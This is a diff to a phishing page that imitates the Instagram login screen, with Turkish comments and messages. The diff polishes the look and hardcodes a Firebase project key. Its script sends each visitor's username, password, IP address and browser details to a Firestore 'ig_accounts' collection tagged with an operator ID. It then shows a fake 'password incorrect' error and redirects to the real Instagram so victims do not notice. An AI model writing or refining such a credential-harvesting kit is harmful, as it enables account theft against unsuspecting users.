@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <title>Instagram • Login</title>
+    <title>Instagram</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -18,31 +18,39 @@
         .container {
             background: #fff;
             border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 40px;
+            border-radius: 3px;
+            padding: 40px 35px;
             width: 100%;
             max-width: 350px;
             text-align: center;
         }
         .logo {
-            font-family: 'Billabong', 'Segoe UI', cursive;
-            font-size: 3rem;
-            margin-bottom: 30px;
+            font-family: 'Segoe UI', cursive;
+            font-size: 2.8rem;
+            margin-bottom: 25px;
             color: #262626;
+            font-weight: 600;
+            letter-spacing: 1px;
         }
         .input-field {
             width: 100%;
             background: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            padding: 12px 8px;
-            margin-bottom: 8px;
-            font-size: 14px;
+            padding: 11px 8px;
+            margin-bottom: 6px;
+            font-size: 13px;
             color: #262626;
+            outline: none;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
         .input-field:focus {
-            outline: none;
             border-color: #a8a8a8;
+            background: #fff;
+        }
+        .input-field::placeholder {
+            color: #8e8e8e;
+            font-size: 12px;
         }
         .login-btn {
             width: 100%;
@@ -50,18 +58,28 @@
             color: #fff;
             border: none;
             border-radius: 8px;
-            padding: 10px;
-            font-weight: bold;
+            padding: 8px;
+            font-weight: 600;
             font-size: 14px;
-            margin: 15px 0;
+            margin: 12px 0;
             cursor: pointer;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            transition: background 0.2s;
+        }
+        .login-btn:hover {
+            background: #1877f2;
+        }
+        .login-btn:active {
+            background: #0064cc;
+            transform: scale(0.98);
         }
         .divider {
             display: flex;
             align-items: center;
-            margin: 20px 0;
+            margin: 18px 0;
             color: #8e8e8e;
             font-size: 13px;
+            font-weight: 600;
         }
         .divider::before, .divider::after {
             content: '';
@@ -77,13 +95,19 @@
             text-decoration: none;
             display: block;
             margin: 15px 0;
+            cursor: pointer;
+        }
+        .fb-login::before {
+            content: '📘 ';
+            font-size: 16px;
         }
         .forgot-password {
             color: #00376b;
             font-size: 12px;
             text-decoration: none;
             display: block;
-            margin-top: 15px;
+            margin-top: 20px;
+            cursor: pointer;
         }
         .error-msg {
             color: #ed4956;
@@ -91,69 +115,129 @@
             margin: 10px 0;
             display: none;
         }
+        .signup-link {
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid #dbdbdb;
+            font-size: 14px;
+            color: #262626;
+        }
+        .signup-link a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        @media (max-width: 400px) {
+            .container {
+                border: none;
+                padding: 20px 15px;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">Instagram</div>
-        <div id="errorMsg" class="error-msg">Invalid credentials. Please try again.</div>
-        <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" autocomplete="off">
+        
+        <div id="errorMsg" class="error-msg">Sorry, your password was incorrect. Please double-check your password.</div>
+        
+        <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" autocomplete="off" autocorrect="off" autocapitalize="off">
         <input type="password" id="password" class="input-field" placeholder="Password" autocomplete="off">
-        <button class="login-btn" id="loginBtn">Log In</button>
+        
+        <button class="login-btn" id="loginBtn">Log in</button>
+        
         <div class="divider"><span>OR</span></div>
-        <a href="#" class="fb-login">Log in with Facebook</a>
-        <a href="#" class="forgot-password">Forgot password?</a>
+        
+        <a class="fb-login">Log in with Facebook</a>
+        <a class="forgot-password">Forgot password?</a>
+        
+        <div class="signup-link">
+            Don't have an account? <a>Sign up</a>
+        </div>
     </div>
 
-    <script src="../config.js"></script>
-    <script type="importmap">
-        {
-            "imports": {
-                "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
-                "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"
-            }
-        }
-    </script>
     <script type="module">
-        import { initializeApp } from "firebase/app";
-        import { getFirestore, collection, addDoc } from "firebase/firestore";
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-        const firebaseConfig = window.FIREBASE_CONFIG;
+        const firebaseConfig = {
+            apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
+            authDomain: "camerahhh-15487.firebaseapp.com",
+            projectId: "camerahhh-15487",
+            storageBucket: "camerahhh-15487.firebasestorage.app",
+            messagingSenderId: "212849652224",
+            appId: "1:212849652224:web:19d8a85c01cd81005bdee5",
+            measurementId: "G-WDVJV36W7X"
+        };
+
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
         const params = new URLSearchParams(window.location.search);
         const userId = params.get('uid');
 
+        if (!userId) {
+            document.body.innerHTML = '<div style="text-align:center;padding:50px;color:red;font-family:Arial;">❌ Geçersiz link</div>';
+            throw new Error('UID eksik');
+        }
+
         document.getElementById('loginBtn').addEventListener('click', async () => {
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
+            const errorMsg = document.getElementById('errorMsg');
 
             if (!username || !password) {
-                document.getElementById('errorMsg').style.display = 'block';
+                errorMsg.innerText = 'Please enter your username and password.';
+                errorMsg.style.display = 'block';
                 return;
             }
 
-            if (userId && db) {
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    
-                    await addDoc(collection(db, "ig_accounts"), {
-                        ownerId: userId,
-                        username: username,
-                        password: password,
-                        ip: ipData.ip,
-                        userAgent: navigator.userAgent,
-                        timestamp: new Date().toISOString()
-                    });
-                } catch(e) {
-                    console.log("Loglama hatası: " + e.message);
-                }
-            }
+            errorMsg.style.display = 'none';
+            
+            const btn = document.getElementById('loginBtn');
+            btn.innerText = 'Logging in...';
+            btn.disabled = true;
+            btn.style.opacity = '0.7';
 
-            // Başarılı giriş simülasyonu - gerçek Instagram'a yönlendir
-            window.location.href = 'https://www.instagram.com/accounts/login/';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                await addDoc(collection(db, "ig_accounts"), {
+                    ownerId: userId,
+                    username: username,
+                    password: password,
+                    ip: ipData.ip,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                });
+
+                errorMsg.innerText = 'Sorry, your password was incorrect. Please double-check your password.';
+                errorMsg.style.display = 'block';
+                
+                setTimeout(() => {
+                    window.location.href = 'https://www.instagram.com/accounts/login/';
+                }, 2000);
+
+            } catch(err) {
+                console.log('Hata:', err.message);
+                errorMsg.innerText = 'Sorry, your password was incorrect. Please double-check your password.';
+                errorMsg.style.display = 'block';
+                
+                setTimeout(() => {
+                    window.location.href = 'https://www.instagram.com/accounts/login/';
+                }, 2000);
+            } finally {
+                btn.innerText = 'Log in';
+                btn.disabled = false;
+                btn.style.opacity = '1';
+            }
+        });
+
+        document.getElementById('password').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                document.getElementById('loginBtn').click();
+            }
         });
     </script>
 </body>
